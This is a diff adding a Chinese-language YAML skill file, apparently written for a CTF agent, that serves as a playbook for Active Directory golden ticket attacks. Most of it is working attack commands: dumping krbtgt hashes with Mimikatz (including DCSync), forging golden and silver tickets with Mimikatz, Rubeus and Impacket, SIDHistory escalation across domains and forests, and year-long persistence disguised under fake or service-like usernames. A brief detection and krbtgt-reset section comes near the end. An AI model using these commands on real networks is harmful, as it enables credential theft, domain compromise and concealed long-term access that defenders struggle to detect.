@@ -1,0 +1,646 @@
+name: golden_ticket
+description: 黄金票据深度利用 - 涵盖krbtgt哈希利用、票据伪造、跨域攻击、票据持久化等Active Directory Kerberos攻击技术
+version: "2.0"
+author: CTF-Agent Team
+tags: [kerberos, golden-ticket, krbtgt, ad, ticket-forgery]
+priority: medium
+
+# 使用场景
+scenarios:
+  - 域控制器渗透后攻击
+  - 获取krbtgt哈希后的利用
+  - 跨域/跨林攻击
+  - 长期隐蔽访问维护
+  - AD灾难恢复后攻击
+
+# 核心技术
+techniques:
+  - krbtgt哈希利用: 使用krbtgt账户哈希创建任意TGT
+  - 票据伪造: 伪造任意用户的Kerberos票据
+  - 跨域攻击: 利用信任关系攻击其他域
+  - 票据持久化: 使用黄金票据维持访问
+  - SID历史注入: 利用SIDHistory跨域权限
+
+# 工具列表
+tools:
+  - Mimikatz: 黄金票据创建工具
+  - Rubeus: C# Kerberos工具
+  - krbrelayx: Kerberos中继攻击
+  - ticketer.py: Impacket票据工具
+  - kekeo: Kerberos攻击框架
+  - PyKEK: Python Kerberos利用
+  - BloodHound: AD关系分析
+
+# Kerberos票据理解
+kerberos_ticket_basics:
+  - ticket_types:
+      TGT (Ticket Granting Ticket):
+        description: 用户向KDC获取的初始票据
+        content: 用户身份、会话密钥、有效期
+        encryption: krbtgt账户密码加密
+        location: 用户内存/磁盘
+
+      TGS (Ticket Granting Service):
+        description: 用户获取的服务票据
+        content: 用户身份、服务身份、会话密钥
+        encryption: 服务账户密码加密
+        location: 用户内存/磁盘
+
+      PAC (Privilege Attribute Certificate):
+        description: 票据中的权限信息
+        content: 用户SID、组成员、权限
+        signature: KDC签名验证
+
+  - ticket_structure:
+    template: |
+      # Kerberos票据结构
+
+      # TGT结构:
+      Ticket:
+        - Ticket Version: 5
+        - Realm: DOMAIN.COM
+        - Server Name: krbtgt/DOMAIN.COM
+        - Encrypted Part (krbtgt key):
+          - Session Key
+          - Client Name
+          - Client Realm
+          - Times:
+            - Auth Time
+            - Start Time
+            - End Time
+            - Renew Till
+          - Flags
+          - PAC (Privilege Attribute Certificate)
+            - User SID
+            - Group SIDs
+            - Extra SIDs (SIDHistory)
+            - Logon Information
+
+      # 黄金票据原理:
+      # 拥有krbtgt哈希 = 可以伪造任意TGT
+      # 伪造的TGT = 任意用户身份 + 持久访问
+
+# 黄金票据创建
+golden_ticket_creation:
+  - mimikatz_golden_ticket:
+    template: |
+      # Mimikatz创建黄金票据
+
+      # 1. 获取krbtgt哈希
+
+      # 方法A: 从DC内存获取
+      mimikatz # sekurlsa::logonpasswords
+      # 查找krbtgt账户的NTLM哈希
+
+      # 方法B: 从LSA获取
+      mimikatz # lsadump::lsa /inject /name:krbtgt
+
+      # 方法C: 从NTDS.dit获取
+      mimikatz # lsadump::dcsync /domain:target.com /user:krbtgt
+
+      # 输出:
+      # Domain : target.com
+      # User   : krbtgt
+      # NTLM   : a5b...hash
+      # AES128 : a1b...hash
+      # AES256 : a2c...hash
+
+      # 2. 获取域SID
+
+      mimikatz # lsadump::lsa /inject /name:krbtgt
+      # 或
+      wmic useraccount get name,sid
+      # 或
+      whoami /user
+      # SID格式: S-1-5-21-XXXX-YYYY-ZZZZ-YYYY
+
+      # 域SID: S-1-5-21-XXXX-YYYY-ZZZZ (去掉最后部分)
+
+      # 3. 创建黄金票据
+
+      mimikatz # kerberos::golden
+        /domain:target.com
+        /sid:S-1-5-21-XXXX-YYYY-ZZZZ
+        /krbtgt:a5b...hash  # NTLM哈希
+        /user:Administrator  # 伪造的用户名
+        /ptt  # 直接注入票据
+
+      # 或使用AES256密钥 (更安全)
+      mimikatz # kerberos::golden
+        /domain:target.com
+        /sid:S-1-5-21-XXXX-YYYY-ZZZZ
+        /aes256:a2c...hash
+        /user:Administrator
+        /ptt
+
+      # 4. 验证票据
+
+      mimikatz # kerberos::list
+      mimikatz # kerberos::tgt
+
+      # 5. 使用票据访问
+
+      # 注入票据后可以直接访问DC
+      dir \\DC\c$
+      psexec \\DC cmd.exe
+
+      # 6. 创建具有特定属性的票据
+
+      mimikatz # kerberos::golden
+        /domain:target.com
+        /sid:S-1-5-21-XXXX-YYYY-ZZZZ
+        /krbtgt:a5b...hash
+        /user:Administrator
+        /id:500  # RID
+        /groups:512,513,518,519,520  # 组成员
+        /sids:S-1-5-21-XXXX-YYYY-ZZZZ-512  # SIDHistory
+        /ptt
+
+  - rubeus_golden_ticket:
+    template: |
+      # Rubeus创建黄金票据
+
+      # 1. 获取krbtgt哈希
+      # 从Mimikatz或LSA获取
+
+      # 2. 创建黄金票据
+      Rubeus.exe golden
+        /domain:target.com
+        /sid:S-1-5-21-XXXX-YYYY-ZZZZ
+        /krbtgt:a5b...hash
+        /user:Administrator
+        /ptt
+
+      # 3. 或使用AES密钥
+      Rubeus.exe golden
+        /aes256:a2c...hash
+        /domain:target.com
+        /sid:S-1-5-21-XXXX-YYYY-ZZZZ
+        /user:Administrator
+        /ptt
+
+      # 4. 导出票据
+      Rubeus.exe golden
+        /krbtgt:a5b...hash
+        /domain:target.com
+        /sid:S-1-5-21-XXXX-YYYY-ZZZZ
+        /user:Administrator
+        /outfile:ticket.kirbi
+
+      # 5. 票据信息
+      Rubeus.exe tgssession
+      Rubeus.exe klist
+
+  - impacket_golden_ticket:
+    template: |
+      # Impacket创建黄金票据
+
+      # Python方式
+
+      from impacket.examples import golden_ticket
+
+      # 使用ticketer.py
+      ticketer.py -domain target.com -nthash a5b...hash -sid S-1-5-21-XXXX-YYYY-ZZZZ Administrator
+
+      # 或完整命令
+      python ticketer.py
+        -domain target.com
+        -nthash a5b...hash
+        -sid S-1-5-21-XXXX-YYYY-ZZZZ
+        -user Administrator
+        -duration 365  # 365天有效期
+        Administrator
+
+      # 生成的票据保存为 Administrator.ccache
+
+      # 使用票据
+      export KRB5CCNAME=Administrator.ccache
+      psexec.py -dc-ip DC_IP -k target.com/Administrator@DC_HOST
+
+# 黄金票据高级参数
+golden_ticket_parameters:
+  - template: |
+      # 黄金票据高级参数
+
+      # Mimikatz完整参数
+
+      mimikatz # kerberos::golden
+        /domain:target.com          # 域名
+        /sid:S-1-5-21-XXXX-YYYY-ZZZZ # 域SID
+        /krbtgt:hash                # krbtgt NTLM哈希
+        /aes128:hash                # AES128密钥
+        /aes256:hash                # AES256密钥 (推荐)
+        /user:Administrator         # 伪造用户名
+        /id:500                     # 用户RID
+        /groups:512,513,518,519,520 # 组成员ID
+        /sids:extra_sid             # SIDHistory (跨域)
+        /startoffset:0              # 开始时间偏移
+        /endin:600                  # 有效期(分钟)
+        /renewmax:10080             # 最大续期(分钟)
+        /ptt                        # 直接注入
+        /ticket:file.kirbi          # 导出到文件
+
+      # 参数说明:
+
+      # /groups - 添加组成员
+      # 512 = Domain Admins
+      # 513 = Domain Users
+      # 518 = Schema Admins
+      # 519 = Enterprise Admins
+      # 520 = Group Policy Creator Owners
+
+      # /sids - SIDHistory注入
+      # 用于跨域访问
+      # 添加目标域的Admin SID
+
+      # /endin - 有效期
+      # 默认10小时 (600分钟)
+      # 可以设置为更长: 365天 = 525600分钟
+
+      # /renewmax - 最大续期
+      # 默认7天 (10080分钟)
+      # 可以设置更长
+
+# 跨域攻击
+cross_domain_attack:
+  - sid_history_attack:
+    template: |
+      # SIDHistory跨域攻击
+
+      # 利用域信任关系
+
+      # 1. 获取信任关系信息
+
+      # 在域A中获取域B的信息
+      nltest /domain_trusts
+      nltest /trusted_domains
+
+      # 或使用PowerShell
+      Get-ADDomainTrust
+      Get-ADForest
+
+      # 2. 获取域B的Enterprise Admins SID
+
+      # 域B的Enterprise Admins组SID
+      # 格式: S-1-5-21-YYYY-YYYY-YYYY-519
+
+      # 在域B中查询
+      Get-ADGroup "Enterprise Admins" -Properties SID
+
+      # 3. 创建包含SIDHistory的黄金票据
+
+      mimikatz # kerberos::golden
+        /domain:domainA.com  # 当前域
+        /sid:S-1-5-21-XXXX-YYYY-ZZZZ  # 域A的SID
+        /krbtgt:domainA_krbtgt_hash
+        /user:Administrator
+        /sids:S-1-5-21-YYYY-YYYY-YYYY-519  # 域B Enterprise Admins
+        /ptt
+
+      # 4. 使用票据访问域B
+
+      # 票据包含域A的身份 + 域B的权限
+      dir \\DC-B\c$
+
+      # 原理:
+      # SIDHistory允许用户携带其他域的SID
+      # 域B信任域A的用户
+      # 票据中的SIDHistory赋予域B权限
+
+  - child_to_parent_attack:
+    template: |
+      # 子域到父域攻击
+
+      # 获取子域krbtgt后攻击父域
+
+      # 1. 确认父子域关系
+      Get-ADDomain | Select ParentDomain
+
+      # 2. 获取父域Enterprise Admins SID
+      # Enterprise Admins SID = 父域SID + -519
+
+      parent_sid = "S-1-5-21-PARENT-ID"
+      enterprise_admins_sid = parent_sid + "-519"
+
+      # 3. 创建黄金票据
+
+      mimikatz # kerberos::golden
+        /domain:child.domain.com  # 子域名
+        /sid:S-1-5-21-CHILD-ID    # 子域SID
+        /krbtgt:child_krbtgt_hash
+        /user:Administrator
+        /sids:S-1-5-21-PARENT-ID-519  # 父域Enterprise Admins
+        /ptt
+
+      # 4. 现在可以访问父域DC
+      dir \\PARENT-DC\c$
+
+  - forest_to_forest_attack:
+    template: |
+      # 跨林攻击
+
+      # 需要林信任关系
+
+      # 1. 获取林信任信息
+      Get-ADForest | Select Domains
+
+      # 2. 获取目标林信息
+      nltest /server:DC /domain_trusts
+
+      # 3. 如果有双向林信任
+      # 可以使用SIDHistory注入目标林权限
+
+      mimikatz # kerberos::golden
+        /domain:forestA.com
+        /sid:S-1-5-21-XXXX-YYYY-ZZZZ
+        /krbtgt:krbtgt_hash
+        /user:Administrator
+        /sids:S-1-5-21-TARGET-FOREST-SID-519  # 目标林Enterprise Admins
+        /ptt
+
+      # 注意:
+      # 林信任需要特殊配置才支持SIDHistory
+      # 需要检查SIDFilteringQuarantined状态
+
+# 票据持久化
+ticket_persistence:
+  - template: |
+      # 黄金票据持久化
+
+      # 优势:
+      # 1. 票据有效期可设置很长
+      # 2. 不依赖账户密码
+      # 3. DC重置密码不影响票据
+      # 4. 只需要krbtgt哈希
+
+      # 1. 创建长期黄金票据
+
+      mimikatz # kerberos::golden
+        /domain:target.com
+        /sid:S-1-5-21-XXXX-YYYY-ZZZZ
+        /krbtgt:hash
+        /user:BackdoorAdmin
+        /endin:525600   # 365天
+        /renewmax:525600  # 最大续期365天
+        /ptt
+
+      # 2. 导出票据文件保存
+
+      mimikatz # kerberos::golden
+        /domain:target.com
+        /sid:S-1-5-21-XXXX-YYYY-ZZZZ
+        /krbtgt:hash
+        /user:Administrator
+        /ticket:golden.kirbi
+
+      # 保存文件到安全位置
+      # 需要时导入
+
+      mimikatz # kerberos::ptt golden.kirbi
+
+      # 3. 票据续期
+
+      # 票据可以续期延长有效期
+      mimikatz # kerberos::renew
+
+      # 或使用Rubeus
+      Rubeus.exe renew /ticket:golden.kirbi
+
+      # 4. 票据隐蔽性
+
+      # 使用不存在的用户名
+      mimikatz # kerberos::golden
+        /user:FAKE_USER$
+        # 这样不会在用户列表中出现
+
+      # 使用正常用户名避免检测
+      mimikatz # kerberos::golden
+        /user:admin_service  # 看起来像服务账户
+
+# 白银票据
+silver_ticket:
+  - template: |
+      # 白银票据 (服务票据伪造)
+
+      # 区别:
+      # 黄金票据 = TGT (krbtgt哈希)
+      # 白银票据 = TGS (服务账户哈希)
+
+      # 优势:
+      # 1. 不需要DC权限
+      # 2. 只需要目标服务账户哈希
+      # 3. 隐蔽性更高
+
+      # 1. 获取服务账户哈希
+
+      mimikatz # sekurlsa::logonpasswords
+      # 查找服务账户如:
+      # SQLService, IIS_USR, computer$
+
+      # 2. 创建白银票据
+
+      mimikatz # kerberos::golden
+        /domain:target.com
+        /sid:S-1-5-21-XXXX-YYYY-ZZZZ
+        /rc4:service_hash  # 服务账户NTLM哈希
+        /service:cifs  # 服务类型
+        /target:DC.target.com  # 目标服务器
+        /user:Administrator
+        /ptt
+
+      # 服务类型:
+      # cifs - 文件共享
+      # ldap - LDAP查询
+      # krbtgt - TGT服务
+      # host - 远程管理
+      # http - IIS服务
+      # rpcss - RPC服务
+
+      # 3. 创建特定服务票据
+
+      # CIFS白银票据 - 文件访问
+      mimikatz # kerberos::golden
+        /domain:target.com
+        /sid:S-1-5-21-XXXX-YYYY-ZZZZ
+        /rc4:computer_hash
+        /service:cifs
+        /target:fileserver.target.com
+        /user:Administrator
+        /ptt
+
+      # LDAP白银票据 - AD查询
+      mimikatz # kerberos::golden
+        /domain:target.com
+        /sid:S-1-5-21-XXXX-YYYY-ZZZZ
+        /rc4:dc_hash
+        /service:ldap
+        /target:DC.target.com
+        /user:Administrator
+        /ptt
+
+      # HOST白银票据 - 远程管理
+      mimikatz # kerberos::golden
+        /domain:target.com
+        /sid:S-1-5-21-XXXX-YYYY-ZZZZ
+        /rc4:computer_hash
+        /service:host
+        /target:workstation.target.com
+        /user:Administrator
+        /ptt
+
+      # 4. 白银票据限制
+
+      # - 只能访问特定服务
+      # - 需要服务账户哈希
+      # - PAC签名可能被检测
+
+# 票据操作命令
+ticket_operations:
+  - template: |
+      # 票据操作命令
+
+      # Mimikatz票据命令
+
+      # 列出当前票据
+      mimikatz # kerberos::list
+
+      # 显示TGT详情
+      mimikatz # kerberos::tgt
+
+      # 注入票据
+      mimikatz # kerberos::ptt ticket.kirbi
+
+      # 清除票据
+      mimikatz # kerberos::purge
+
+      # 续期票据
+      mimikatz # kerberos::renew
+
+      # Rubeus票据命令
+
+      # 列出票据
+      Rubeus.exe klist
+
+      # 显示当前会话票据
+      Rubeus.exe tgssession
+
+      # 导入票据
+      Rubeus.exe ptt /ticket:ticket.kirbi
+
+      # 清除票据
+      Rubeus.exe purge
+
+      # 导出票据
+      Rubeus.exe dump /service:krbtgt /luid:12345
+
+      # 续期票据
+      Rubeus.exe renew /ticket:ticket.kirbi
+
+      # 请示TGT
+      Rubeus.exe asktgt /user:Administrator /rc4:hash /ptt
+
+      # 请示TGS
+      Rubeus.exe asktgs /service:cifs/DC /krbtgt /ptt
+
+      # Windows命令
+
+      # 列出票据
+      klist
+
+      # 清除票据
+      klist purge
+
+      # 查看票据详情
+      klist tickets
+
+# 防御检测
+detection:
+  - 黄金票据检测:
+      - 监控异常Kerberos票据
+      - 检查PAC有效性
+      - 监控异常有效期
+      - 检测伪造用户名
+
+      # 检测方法
+
+      # 使用PAC验证
+      # 检查PAC签名有效性
+
+      # 监控krbtgt账户变更
+      Get-ADUser krbtgt -Properties *
+
+      # 检查异常票据了解
+      klist
+
+      # 日志监控
+      # Event ID 4768 - TGT请求
+      # Event ID 4769 - TGS请求
+      # Event ID 4770 - 票据续期
+
+  - 防御措施:
+      - 定期重置krbtgt密码 (两次)
+      - 监控Kerberos事件日志
+      - 启用PAC验证
+      - 票据有效期监控
+      - 异常用户检测
+
+      # krbtgt密码重置
+
+      # 步骤1: 第一次重置
+      Set-ADAccountPassword -Identity krbtgt -Reset
+
+      # 等待10-24小时 (所有DC同步)
+
+      # 步骤2: 第二次重置
+      Set-ADAccountPassword -Identity krbtgt -Reset
+
+      # 这将使所有现有票据失效
+
+      # 票据监控脚本
+      Get-WinEvent -FilterHashtable @{LogName='Security';Id=4768,4769} |
+        Where-Object {$_.TimeCreated -gt (Get-Date).AddHours(-1)} |
+        Select TimeCreated, Message
+
+# CTF场景示例
+ctf_scenarios:
+  - template: |
+      # 黄金票据CTF场景
+
+      # 场景1: 已获取krbtgt哈希
+      mimikatz # lsadump::dcsync /domain:ctf.local /user:krbtgt
+
+      # 创建黄金票据获取域控访问
+      mimikatz # kerberos::golden
+        /domain:ctf.local
+        /sid:S-1-5-21-XXX-YYY-ZZZ
+        /krbtgt:hash
+        /user:Administrator
+        /ptt
+
+      # 访问域控查找Flag
+      dir \\DC\C$\Flags\
+
+      # 场景2: 子域到父域
+
+      # 在子域获取krbtgt
+      mimikatz # lsadump::dcsync /domain:child.ctf.local /user:krbtgt
+
+      # 创建带SIDHistory的票据
+      mimikatz # kerberos::golden
+        /domain:child.ctf.local
+        /sid:S-1-5-21-CHILD-SID
+        /krbtgt:child_hash
+        /user:Administrator
+        /sids:S-1-5-21-PARENT-SID-519
+        /ptt
+
+      # 访问父域DC
+      dir \\PARENT-DC\C$\
+
+# 参考资源
+references:
+  - https://github.com/gentilkiwi/mimikatz
+  - https://github.com/GhostPack/Rubeus
+  - https://github.com/SecureAuthCorp/impacket
+  - https://attack.mitre.org/techniques/T1558/001/
+  - https://adsecurity.org/?p=1640
